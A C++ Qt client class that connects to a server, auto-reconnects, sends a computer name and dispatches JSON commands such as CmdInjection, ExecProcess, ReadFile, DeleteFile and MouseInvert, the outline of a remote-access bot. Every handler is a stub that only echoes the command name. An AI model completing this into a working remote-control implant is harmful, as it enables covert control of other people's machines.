#include "qclient.h"

QClient::QClient(QString h, qint16 p, QObject *parent) : 
	host(h), port(p) , QObject(parent)
{
    sock = new QTcpSocket(this);
	connect(sock, SIGNAL(connected()), this, SLOT(connected()));
	connect(sock, SIGNAL(disconnected()), this, SLOT(disconnected()));
	connect(sock, SIGNAL(disconnected()), this, SLOT(disconnected()));
	connect(sock, SIGNAL(disconnected()), this, SLOT(tryToConnect()));
	connect(sock, SIGNAL(readyRead()), this, SLOT(readyRead()));

	tryToConnect();

	compName = "Doru";
}

void QClient::tryToConnect()
{
	sock->connectToHost(host, port);
}

void QClient::connected()
{
	sock->write(compName.toUtf8());
	sock->waitForBytesWritten(50);
}

void QClient::disconnected()
{

}

void QClient::readyRead()
{
	if (sock->bytesAvailable())
	{
		QByteArray data = sock->readAll();
		QJsonDocument doc = QJsonDocument::fromJson(data);
		QJsonObject resp;
		qDebug() << data;
		if (doc.isObject())
		{
			QJsonObject obj = doc.object();
			if (obj.contains("Id"))
			{
				int id = obj.value("Id").toInt();
				QString response;
				switch ((Commands)id)
				{
				case Commands::CmdInjection:
					response = "CmdInjection";
					break;
				case Commands::ExecProcess:
					response = "ExecProcess";
					break;
				case Commands::CreateFile:
					response = "CreateFile";
					break;
				case Commands::ReadFile:
					response = "ReadFile";
					break;
				case Commands::DeleteFile:
					response = "DeleteFile";
					break;
				case Commands::MouseInvert:
					response = "MouseInvert";
					break;
				case Commands::DisplayRotate:
					response = "DisplayRotate";
					break;
				case Commands::OsMessage:
					response = "OsMessage";
					break;
				default:
					response = "UNKNOWN COMMAND";
					break;
				}
				QJsonValue val = response;
				resp.insert("response", val);
			}
		}
		else
		{
			QJsonValue val = "Invalid Format. Explected JSON";
			resp.insert("response", val);
		}
		QJsonDocument docToSend(resp);
		QByteArray a = docToSend.toJson();
		qDebug() << a;
		sock->write(a);
	}
}

QClient::~QClient()
{
    delete sock;
}
